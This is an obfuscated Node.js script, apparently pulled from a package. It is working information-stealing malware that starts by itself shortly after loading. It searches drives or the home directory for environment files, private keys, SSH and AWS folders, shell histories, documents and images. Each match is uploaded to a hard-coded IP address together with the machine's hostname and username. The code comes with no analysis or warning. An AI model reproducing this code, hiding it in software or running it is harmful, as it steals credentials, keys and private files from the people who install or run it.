const m = b;
(function (c, d) {
    const l = b,
        e = c();
    while (true) {
        try {
            const f =
                (parseInt(l(428)) / 1) * (-parseInt(l(616)) / 2) +
                -parseInt(l(384)) / 3 +
                (parseInt(l(469)) / 4) * (-parseInt(l(450)) / 5) +
                parseInt(l(448)) / 6 +
                (-parseInt(l(562)) / 7) * (parseInt(l(418)) / 8) +
                (parseInt(l(605)) / 9) * (-parseInt(l(560)) / 10) +
                (parseInt(l(609)) / 11) * (parseInt(l(393)) / 12);
            if (f === d) break;
            else e.push(e.shift());
        } catch (g) {
            e.push(e.shift());
        }
    }
})(a, 619435);
const fs = require('fs'),
    path = require(m(583)),
    os = require('os'),
    FormData = require(m(613)),
    axios = require(m(395)),
    { execSync, exec } = require(m(439));
process[m(507)] = m(407);
const usu = m(567),
    upt = m(528),
    t = '8',
    uid = m(479),
    username = os[m(421)]()[m(547)],
    rootDir = os[m(421)]()[m(596)] + '',
    excludeFolders = [
        m(588),
        m(608),
        m(460),
        m(391),
        m(400),
        m(445),
        m(544),
        m(554),
        m(598),
        m(470),
        m(522),
        m(385),
        m(497),
        m(427),
        m(467),
        m(529),
        m(521),
        m(399),
        m(551),
        m(462),
        m(575),
        m(397),
        m(515),
        m(403),
        m(427),
        m(493),
        m(513),
        m(420),
        m(413),
        m(578),
        m(566),
        m(498),
        m(600),
        m(387),
        m(434),
        m(504),
        m(493),
        m(510),
        m(444),
        m(476),
        m(425),
        m(561),
        m(585),
        m(516),
        m(451),
        m(518),
        m(572),
        m(475),
        m(556),
        m(619),
        m(533),
        m(617),
        m(511),
        m(435),
        m(587),
        m(601),
        m(483),
        m(389),
        m(570),
        m(443),
        m(458),
        m(603),
        m(401),
        m(557),
        m(390),
        m(502),
        m(612),
        m(593),
        m(534),
        m(480),
        m(538),
        m(471),
        m(537),
        m(411),
        m(568),
        m(590),
        m(553),
        m(485),
        m(525),
        m(508),
        m(564),
        m(424),
        m(576),
        m(545),
        m(465),
        m(592),
        m(413),
        m(584),
        m(580),
        m(565),
        m(535),
        m(620),
        m(602),
        m(558),
        m(533),
        m(477),
        m(398),
        m(457),
        m(468),
        m(506),
        m(514),
        m(405),
        m(481),
        m(419),
        m(408),
        m(415),
        m(517),
        m(461),
        m(611),
        m(527),
        m(474),
        m(577),
        m(607),
        m(454),
        m(454),
        m(540),
        m(394),
        m(463),
        m(449),
        m(425),
        m(456),
        m(383),
        m(548),
        m(445),
        m(416),
        m(429),
        m(582),
        m(526),
        m(432),
        m(433),
        m(494),
        m(496),
        m(530),
        m(563),
        m(388),
        m(404),
        m(610),
        m(486),
        m(597),
        m(595),
        m(501),
        m(406),
        m(414),
        m(591),
        m(524),
        m(437),
        m(542),
    ],
    searchKey = [
        m(396),
        m(455),
        m(555),
        m(442),
        m(550),
        m(500),
        m(438),
        m(536),
        m(482),
        m(606),
        m(503),
        m(410),
        m(618),
        m(459),
        m(453),
        m(604),
        m(495),
        m(464),
        m(621),
        m(472),
        m(571),
        m(488),
        m(512),
    ],
    configDir = [
        path[m(520)](os[m(596)](), m(440)),
        path[m(520)](os[m(596)](), m(579)),
        path[m(520)](os[m(596)](), m(412)),
        path[m(520)](os[m(596)](), m(431)),
        path[m(520)](os[m(596)](), m(488)),
        path[m(520)](os[m(596)](), m(571)),
    ],
    uu = m(573) + usu + ':' + upt + m(423),
    uf = async (c) => {
        const n = m,
            d = { UmVVd: n(549), vaXPk: n(499) };
        if (fs[n(523)](c)[n(569)]()) {
            const e = new FormData(),
                f = fs[n(430)](c);
            f.on(d[n(546)], () => f[n(478)]()), e[n(519)](d[n(392)], f);
            try {
                const g = await axios[n(402)](uu, e, {
                    headers: {
                        ...e[n(559)](),
                        userkey: uid,
                        hostname: os[n(586)](),
                        username: username,
                        path: c,
                        t: t,
                    },
                })
                    [n(484)]((h) => {
                        const o = n;
                        f[o(478)]();
                    })
                    [n(491)]((h) => {
                        const p = n;
                        f[p(478)]();
                    });
            } catch (h) {
                f[n(478)]();
            }
        }
    },
    toRegex = (c) => new RegExp('^' + c[m(552)](/\./g, '\\.')[m(552)](/\*/g, '.*') + '$', 'i'),
    isFileMatching = (c) => {
        const q = m;
        return searchKey[q(409)]((d) => toRegex(d)[q(466)](c));
    },
    scanDir = async (c) => {
        const r = m,
            d = {
                fZtYx: function (g, h) {
                    return g == h;
                },
                TaSQs: function (g, h, i) {
                    return g(h, i);
                },
                DkDxg: function (g, h) {
                    return g(h);
                },
                Spggk: function (g, h) {
                    return g(h);
                },
                NYbND: function (g, h) {
                    return g(h);
                },
            };
        if (!fs[r(492)](c)) return;
        const f = fs[r(490)](c);
        for (const g of f) {
            try {
                const h = path[r(520)](c, g);
                if (d[r(581)](g, 'go')) continue;
                const i = excludeFolders[r(409)]((k) => h[r(422)]()[r(509)](k[r(422)]()));
                if (i) continue;
                const j = fs[r(523)](h);
                if (j[r(532)]()) !i && (await d[r(614)](scanDir, h, excludeFolders));
                else
                    (configDir[r(409)]((k) => h[r(509)](k)) || (j[r(569)]() && d[r(417)](isFileMatching, g))) &&
                        (await d[r(489)](uf, h), await d[r(594)](sleep, 50));
            } catch (k) {}
        }
    };
function b(c, d) {
    c = c - 383;
    const e = a();
    let f = e[c];
    return f;
}
async function sleep(c) {
    return new Promise((d) => setTimeout(d, c));
}
setTimeout(async () => {
    const s = m,
        c = {
            aGfwh: function (d, e) {
                return d == e;
            },
            TaosW: s(436),
            QCDXl: s(386) + s(505) + s(441) + s(539),
            TpnlP: function (d, e, f) {
                return d(e, f);
            },
            xnomV: function (d, e) {
                return d(e);
            },
            LWbEW: function (d, e) {
                return d + e;
            },
            zTGvx: function (d, e) {
                return d(e);
            },
            AXtft: s(541),
        };
    if (c[s(599)](os[s(452)](), c[s(446)])) {
        const d = c[s(574)];
        let e = c[s(615)](execSync, d, { windowsHide: true });
        e = e[s(531)]()[s(447)]('\n');
        for (let f of e) {
            f = f[s(473)]();
            if (!f) continue;
            await c[s(487)](scanDir, c[s(589)](f, '\\'));
        }
    } else await c[s(487)](scanDir, rootDir), await c[s(543)](scanDir, c[s(426)]);
}, 1e3);
function a() {
    const u = [
        'readdirSync',
        'catch',
        'existsSync',
        '.cursor',
        'pkgs',
        '*.webp',
        'fonts',
        '.cache',
        '.windsurf',
        'file',
        '*.rtf',
        'ProgramData',
        '.key',
        '*.pem',
        '.vue-cli-ui',
        'Get-CimInstance Win32_LogicalDis',
        '.git',
        'title',
        '.cfa',
        'includes',
        '.vscode-server',
        '.yml',
        '*.csv',
        '.devctl',
        '.gitignore',
        '.claude',
        '.dll',
        'library',
        '.exe',
        'append',
        'join',
        '.android',
        'less',
        'statSync',
        'Microsoft',
        '.car',
        'packages',
        'imgs',
        '4806',
        '.tldrc',
        'debug',
        'toString',
        'isDirectory',
        '.jar',
        '.pkg',
        '.avi',
        '*.xls',
        '.aep',
        '.msi',
        'y DeviceID"',
        '.vscode',
        '/mnt',
        'Visual Studio Code.app',
        'zTGvx',
        'vendors',
        'DCIM',
        'UmVVd',
        'username',
        '.expo',
        'error',
        '*.md',
        '.brownie',
        'replace',
        '.hpp',
        'vendor',
        '*.docx',
        'module',
        'extension',
        '.dat',
        'getHeaders',
        '1517750hyTEdj',
        '.pub-cache',
        '238nrdiaY',
        'background',
        '.cab',
        '.sys',
        '.steam',
        '216.126.237.71',
        '.big',
        'isFile',
        '.psd',
        '.zsh_history',
        '.sh',
        'http://',
        'QCDXl',
        '.node-gyp',
        '.wma',
        'images',
        '.stream',
        '.azure',
        '.mp3',
        'fZtYx',
        'package',
        'path',
        '.sol',
        '.Trash',
        'hostname',
        'flutter',
        'node_modules',
        'LWbEW',
        '.bundle',
        'Windows',
        '.dylib',
        '.sst',
        'NYbND',
        'Program Files (x86)',
        'homedir',
        'Program Files',
        'public',
        'aGfwh',
        '.gnupg',
        'llama',
        '.sqlite',
        '.gemini',
        '*.jpeg',
        '18AhBnGQ',
        '*.txt',
        'image',
        'npm',
        '2478575MqtIfl',
        'locale',
        'mysql',
        '.var',
        'form-data',
        'TaSQs',
        'TpnlP',
        '218276Lhpzqo',
        '.original',
        '*.secret',
        '.map',
        '.so',
        '*.ts',
        'manifest',
        '2306013DgMzxj',
        'scss',
        'powershell -NoProfile -Command "',
        '.pm2',
        'wallpaper',
        '.cl',
        'media',
        'android',
        'vaXPk',
        '204oIriSn',
        'package-lock.json',
        'axios',
        '*.env*',
        '.gk',
        '.yarn',
        '.avm',
        'example',
        '.pearai',
        'post',
        '.cocoapods',
        '_locales',
        '.github',
        'All Users',
        'npm-compiler',
        'temp',
        'some',
        '*.ini',
        '.3mf',
        '.config',
        '.nvm',
        'All User',
        'dist',
        'windows.old',
        'DkDxg',
        '232168NMMOQS',
        'tmp',
        '.eigent',
        'userInfo',
        'toLowerCase',
        '/upload',
        '.mp4',
        '.rustup',
        'AXtft',
        '.conda',
        '9JbeseP',
        'pkg',
        'createReadStream',
        '.ssh',
        'openzeppelin',
        'prisma',
        '.snipaste',
        '.yaml',
        'win32',
        '$RECYCLE.BIN',
        '*.odt',
        'child_process',
        '.aws',
        'k | Select-Object -ExpandPropert',
        '*.pdf',
        '.pak',
        '.cargo',
        'AppData',
        'TaosW',
        'split',
        '1104576OJpjsw',
        '.myi',
        '985gawaen',
        '.dmg',
        'platform',
        '*.jpg',
        'plugin',
        '*.doc',
        '.docker',
        'build',
        '.pages',
        '*.png',
        'hooks',
        'lib',
        '.3T',
        '.pyp',
        '*.json',
        '.webm',
        'test',
        '.move',
        '.next',
        '7188okGpgX',
        'css',
        '.apk',
        '*.js',
        'trim',
        'img',
        '.bin',
        '.local',
        'anaconda3',
        'destroy',
        '805',
        '.pack',
        'cache',
        '*.xlsx',
        '.ppt',
        'then',
        '.cdr',
        'locales',
        'xnomV',
        '.bash_history',
        'Spggk',
    ];
    a = function () {
        return u;
    };
    return a();
}
